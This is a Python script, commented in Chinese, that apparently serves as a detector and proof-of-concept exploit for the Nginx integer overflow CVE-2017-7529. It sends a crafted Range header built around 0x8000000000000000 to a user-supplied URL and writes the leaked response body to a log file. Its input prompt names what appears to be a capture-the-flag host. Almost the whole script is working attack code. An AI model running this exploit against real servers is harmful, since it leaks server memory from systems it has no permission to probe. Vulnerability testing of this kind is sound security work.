import requests
import time
import urllib3
def cve20177529():
    try:

        # 构造请求头

        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
        }
        url = input('http://1linenginx.balsnctf.com')

        # 获取正常响应的返回长度

        #verify=False防止ssl证书校验，allow_redirects=False，防止跳转导致误报的出现
        r1 = requests.get(url,headers=headers,verify=False,allow_redirects=False) 
        url_len = len(r1.content)

        # 将数据长度加长，大于返回的正常长度

        addnum = 200
        final_len = url_len + addnum

        # 构造Range请求头，并加进headers中

        # headers['Range'] = "bytes=-%d,-%d" % (final_len, 0x8000000000000000-final_len)

        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
            'Range':"bytes=-%d,-%d" % (final_len, 0x8000000000000000-final_len)
        }

        # 用构造的新的headers发送请求包,并输出结果

        r2 = requests.get(url, headers=headers,verify=False,allow_redirects=False)
        text = r2.text
        code = r2.status_code
        if ('ETag') in text and code == 206:
            print('存在Nginx整数溢出漏洞（CVE-2017-7529）,已输出到cve20177529_log.txt')

            # 将结果输出到文本上

            with open('cve20177529_log.txt','a',encoding="utf-8") as f:
                f.write('存在Nginx整数溢出漏洞（CVE-2017-7529）-------------'+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'-------------\n' + r2.text)
                f.close
        else:
            print('未检测到漏洞')

            # 将结果输出到文本上

            with open('cve20177529_log.txt','a',encoding="utf-8") as f:
                f.write('未检测到漏洞-------------'+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'-------------\n' + r2.text)
                f.close    
        
    except Exception as result:
        print(result)

if __name__ == "__main__":
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    cve20177529()
